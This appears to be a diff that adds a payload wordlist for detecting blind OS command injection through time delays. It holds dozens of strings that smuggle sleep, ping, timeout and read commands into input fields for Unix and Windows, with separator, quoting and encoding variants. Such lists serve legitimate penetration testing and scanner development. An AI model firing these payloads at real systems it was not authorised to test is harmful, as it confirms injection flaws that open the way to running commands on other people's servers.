@@ -1,0 +1,64 @@
+# OS Command Injection - Time-Based Blind Payloads
+# Used when command output is not visible in response
+# Delay-based detection using sleep/ping commands
+
+# Unix sleep (5 second delay)
+;sleep 5
+|sleep 5
+||sleep 5
+&&sleep 5
+$(sleep 5)
+`sleep 5`
+';sleep 5;'
+";sleep 5;"
+%0asleep 5
+127.0.0.1;sleep 5
+localhost|sleep 5
+
+# Unix ping (5 packets ≈ 5 seconds)
+;ping -c 5 127.0.0.1
+|ping -c 5 127.0.0.1
+||ping -c 5 127.0.0.1
+&&ping -c 5 127.0.0.1
+$(ping -c 5 127.0.0.1)
+`ping -c 5 127.0.0.1`
+
+# Windows ping (6 packets for ~5 seconds delay)
+&ping -n 6 127.0.0.1
+|ping -n 6 127.0.0.1
+||ping -n 6 127.0.0.1
+&&ping -n 6 127.0.0.1
+
+# Windows timeout
+&timeout /t 5
+|timeout /t 5
+||timeout /t 5
+&&timeout /t 5
+
+# Variable delays for confirmation testing (10 seconds)
+;sleep 10
+|sleep 10
+$(sleep 10)
+`sleep 10`
+&ping -n 11 127.0.0.1
+&timeout /t 10
+
+# With quotes/escaping
+';sleep 5;'
+";sleep 5;"
+' || sleep 5 || '
+" || sleep 5 || "
+'$(sleep 5)'
+`sleep 5`
+
+# Command substitution with sleep
+;echo $(sleep 5)
+|echo $(sleep 5)
+;echo `sleep 5`
+|echo `sleep 5`
+
+# Alternative Unix delays
+;read -t 5
+;bash -c 'sleep 5'
+;/bin/sleep 5
+;/usr/bin/sleep 5
